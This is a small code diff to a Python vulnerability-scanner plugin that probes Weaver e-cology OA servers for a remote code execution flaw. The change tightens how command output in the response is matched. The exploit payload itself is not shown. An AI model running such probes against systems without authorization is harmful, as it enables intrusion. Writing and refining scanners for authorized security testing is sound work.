@@ -46,7 +46,7 @@ def medusa(Url,RandomAgent,ProxyIp):
             resp = requests.post(payload_url, data=post_data,headers=headers, timeout=10, verify=False)
         con = resp.content
         code = resp.status_code
-        if code==200 and (con.lower().find('system')!=-1 or con.lower().find('root')!=-1):
+        if code==200 and (con.lower().find('system:')!=-1 or con.lower().find('root:')!=-1):
             Medusa = "{} 存在泛微e-cology OA系统远程代码执行漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
             return (Medusa)
     except Exception as e:
